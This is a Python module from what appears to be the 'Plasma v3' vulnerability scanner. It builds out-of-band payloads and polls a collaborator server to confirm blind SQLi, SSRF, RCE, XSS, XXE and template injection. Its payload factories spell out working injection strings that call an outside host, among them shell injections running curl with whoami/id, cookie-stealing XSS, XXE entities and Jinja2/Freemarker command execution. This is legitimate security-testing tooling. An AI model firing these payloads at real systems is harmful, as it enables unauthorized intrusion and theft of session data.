"""
modules/oob_collaborator.py — Plasma v3
──────────────────────────────────────────
OOBCollaborator: blind / OOB vulnerability confirmation.

Confirms blind SQLi, SSRF, RCE, XSS, and XXE via DNS/HTTP callbacks
to a collaborator endpoint instead of relying on error-string matching
or time delays.

Architecture
────────────
  OOBCollaborator
    ├── inject()     — build OOB-enhanced payloads for a given technique
    ├── poll()       — query the collaborator endpoint for recorded hits
    └── confirm()    — convenience: inject + poll + return confirmed findings

Collaborator endpoint
──────────────────────
  Any server that logs incoming DNS/HTTP requests works:
    - Burp Collaborator (--collaborator-url https://xxxx.burpcollaborator.net)
    - interactsh (--collaborator-url https://xxxx.interact.sh)
    - A custom netcat listener + ngrok (--collaborator-url http://your-ngrok/log)

  The poll() method GETs <collaborator_url>/_plasma/hits?token=<token>
  and expects a JSON response: {"hits": ["DNS", "HTTP", ...]} or {"hits": []}

  If your collaborator does not support the poll API, set poll_url=None;
  OOBCollaborator will still generate the payloads (you read the logs manually).

Usage
─────
    from modules.oob_collaborator import OOBCollaborator
    oob = OOBCollaborator(base_url="https://abc123.oastify.com")

    # Get payloads to inject
    payloads = oob.inject("sqli", endpoint_url="http://target.com/search")
    # → [("' AND LOAD_FILE(CONCAT('//abc123.oastify.com/',version()))--", "sqli:oob-dns")]

    # After sending probes, poll for hits
    hits = oob.poll(token="abc123")
    confirmed = hits.get("DNS") or hits.get("HTTP")
"""

from __future__ import annotations

import hashlib
import logging
import asyncio
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Optional

log = logging.getLogger(__name__)


@dataclass
class OOBHit:
    """A recorded callback hit from the collaborator."""
    protocol:  str          # "DNS" | "HTTP" | "SMTP"
    source_ip: str          = ""
    payload:   str          = ""
    timestamp: float        = field(default_factory=time.time)


class OOBCollaborator:
    """
    Generates OOB payloads and polls for confirmed callbacks.

    All payloads embed a unique scan token so concurrent scans don't
    cross-contaminate.

    Thread-safe: no mutable shared state after __init__.
    """

    def __init__(
        self,
        base_url:    str,
        poll_url:    Optional[str] = None,
        scan_token:  Optional[str] = None,
        timeout:     int           = 10,
    ) -> None:
        """
        Args:
            base_url    : Collaborator hostname (DNS/HTTP callbacks land here)
                          e.g. "abc123.oastify.com" or "http://abc123.interact.sh"
            poll_url    : URL to GET for checking recorded hits (optional)
                          e.g. "https://abc123.interact.sh/poll"
            scan_token  : Short unique token embedded in callback subdomains.
                          Auto-generated from base_url if not provided.
            timeout     : Request timeout for poll() calls.
        """
        # Normalise base_url to bare hostname (no scheme needed for DNS payloads)
        self._base     = base_url.replace("https://", "").replace("http://", "").rstrip("/")
        self._poll     = poll_url
        self._token    = scan_token or hashlib.md5(self._base.encode()).hexdigest()[:8]
        self._timeout  = timeout
        self._hits:  list[OOBHit] = []

    # ── Payload generation ────────────────────────────────────────────────────

    def inject(
        self,
        technique:    str,
        endpoint_url: str = "",
        param:        str = "",
    ) -> list[tuple[str, str]]:
        """
        Generate OOB-enhanced payloads for a given technique.

        Args:
            technique    : "sqli" | "ssrf" | "rce" | "xss" | "xxe" | "ssti"
            endpoint_url : target URL (embedded in callback for tracking)
            param        : parameter name (embedded in subdomain)

        Returns:
            list of (payload_str, technique_label) — ready to inject via FuzzEngine.
        """
        # Build unique subdomain: token.param.technique.collaborator
        slug = f"{self._token}.{_slug(param)}.{technique}"
        host = f"{slug}.{self._base}"

        generators = {
            "sqli":  self._sqli_payloads,
            "ssrf":  self._ssrf_payloads,
            "rce":   self._rce_payloads,
            "xss":   self._xss_payloads,
            "xxe":   self._xxe_payloads,
            "ssti":  self._ssti_payloads,
        }
        fn = generators.get(technique)
        if not fn:
            log.debug("[oob] unknown technique: %s", technique)
            return []

        return fn(host)

    def inject_all(self, endpoint_url: str = "") -> list[tuple[str, str]]:
        """Generate OOB payloads for all supported techniques."""
        results: list[tuple[str, str]] = []
        for tech in ("sqli", "ssrf", "rce", "xss", "xxe", "ssti"):
            results.extend(self.inject(tech, endpoint_url=endpoint_url))
        return results

    # ── Polling ───────────────────────────────────────────────────────────────

    def poll(self, wait_seconds: float = 3.0) -> dict[str, list[str]]:
        """
        Poll the collaborator endpoint for recorded hits.

        Args:
            wait_seconds : seconds to wait before querying (let DNS propagate)

        Returns:
            {"DNS": [...], "HTTP": [...], "SMTP": [...]} — empty lists if no hits.
            Returns {} if poll_url is not configured.
        """
        if not self._poll:
            log.debug("[oob] no poll_url configured — check collaborator manually")
            return {}

        time.sleep(max(0.0, wait_seconds))
        return self._do_poll()

    async def async_poll(self, wait_seconds: float = 3.0) -> dict[str, list[str]]:
        """
        Async version of poll() — does not block the event loop.
        Uses asyncio.sleep instead of time.sleep.
        """
        if not self._poll:
            log.debug("[oob] no poll_url configured")
            return {}
        if wait_seconds > 0:
            await asyncio.sleep(wait_seconds)
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, lambda: self._do_poll())

    def _do_poll(self) -> dict[str, list[str]]:
        """Synchronous poll logic, safe to run in executor."""
        try:
            url = f"{self._poll}?token={self._token}"
            req = urllib.request.Request(url, headers={"User-Agent": "Plasma/3 OOBCollaborator"})
            with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                import json
                data = json.loads(resp.read().decode())
                raw_hits = data.get("hits", [])
                result: dict[str, list[str]] = {"DNS": [], "HTTP": [], "SMTP": []}
                for h in raw_hits:
                    proto = h.get("protocol", "HTTP").upper()
                    src   = h.get("remote_address", h.get("source_ip", ""))
                    result.setdefault(proto, []).append(src)
                    self._hits.append(OOBHit(protocol=proto, source_ip=src))
                return result
        except Exception as exc:
            log.debug("[oob] poll failed: %s", exc)
            return {}

    def confirm(
        self,
        technique: str,
        endpoint_url: str,
        param: str = "",
        wait_seconds: float = 3.0,
    ) -> bool:
        """
        Convenience: check if any OOB hit was recorded for this technique.
        (Does NOT send the probe — caller must inject + fire the HTTP request first.)

        Returns True if a DNS or HTTP hit was recorded.
        """
        hits = self.poll(wait_seconds=wait_seconds)
        return bool(hits.get("DNS") or hits.get("HTTP"))

    def recorded_hits(self) -> list[OOBHit]:
        """Return all OOBHit objects recorded so far in this session."""
        return list(self._hits)

    # ── Technique-specific payload factories ─────────────────────────────────

    def _sqli_payloads(self, host: str) -> list[tuple[str, str]]:
        return [
            # MySQL
            (f"' AND LOAD_FILE(CONCAT('//', '{host}', '/a'))--",         "sqli:oob-mysql-load_file"),
            (f"' UNION SELECT LOAD_FILE(CONCAT('//', '{host}', '/a'))--", "sqli:oob-mysql-union"),
            # MSSQL
            (f"'; EXEC xp_dirtree '//{host}/a'--",                       "sqli:oob-mssql-xp_dirtree"),
            (f"'; EXEC master..xp_subdirs '//{host}/a'--",               "sqli:oob-mssql-xp_subdirs"),
            # PostgreSQL
            (f"'; COPY (SELECT '') TO PROGRAM 'nslookup {host}'--",      "sqli:oob-pgsql-copy"),
            # Oracle
            (f"' AND (SELECT DBMS_LDAP.INIT('{host}',80) FROM dual)='",  "sqli:oob-oracle-dbms_ldap"),
        ]

    def _ssrf_payloads(self, host: str) -> list[tuple[str, str]]:
        return [
            (f"http://{host}/",                                          "ssrf:oob-http"),
            (f"https://{host}/",                                         "ssrf:oob-https"),
            (f"//`nslookup {host}`",                                     "ssrf:oob-dns-nslookup"),
        ]

    def _rce_payloads(self, host: str) -> list[tuple[str, str]]:
        return [
            (f"; nslookup {host}",                                       "rce:oob-nslookup"),
            (f"| curl http://{host}/$(whoami)",                          "rce:oob-curl-whoami"),
            (f"`curl http://{host}/$(id)`",                              "rce:oob-backtick-id"),
            (f"$(nslookup {host})",                                      "rce:oob-subshell-nslookup"),
        ]

    def _xss_payloads(self, host: str) -> list[tuple[str, str]]:
        return [
            (f"<script>fetch('http://{host}/'+document.cookie)</script>", "xss:oob-cookie-exfil"),
            (f"<img src='http://{host}/'/>",                              "xss:oob-img-load"),
            (f"<script>new Image().src='http://{host}/'+btoa(document.location)</script>",
             "xss:oob-location-b64"),
        ]

    def _xxe_payloads(self, host: str) -> list[tuple[str, str]]:
        entity = f'<!DOCTYPE x [<!ENTITY oob SYSTEM "http://{host}/">]><x>&oob;</x>'
        return [
            (entity,                                                      "xxe:oob-http-entity"),
            (f'<!DOCTYPE x [<!ENTITY oob SYSTEM "ftp://{host}/">]><x>&oob;</x>',
             "xxe:oob-ftp-entity"),
        ]

    def _ssti_payloads(self, host: str) -> list[tuple[str, str]]:
        return [
            # Jinja2 — executes via popen
            (f"{{% for c in [].__class__.__base__.__subclasses__() %}}{{% if c.__name__ == 'Popen' %}}{{% set p=c(['curl','http://{host}/ssti'],stdout=-1) %}}{{% endif %}}{{% endfor %}}",
             "ssti:oob-jinja2-popen"),
            # Freemarker
            (f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("curl http://{host}/ssti")}}',
             "ssti:oob-freemarker"),
        ]


# ── Helpers ───────────────────────────────────────────────────────────────────

def _slug(s: str) -> str:
    """Make a string safe for use in a DNS subdomain label."""
    import re
    s = s.lower()
    s = re.sub(r"[^a-z0-9-]", "-", s)
    return s[:16].strip("-") or "p"
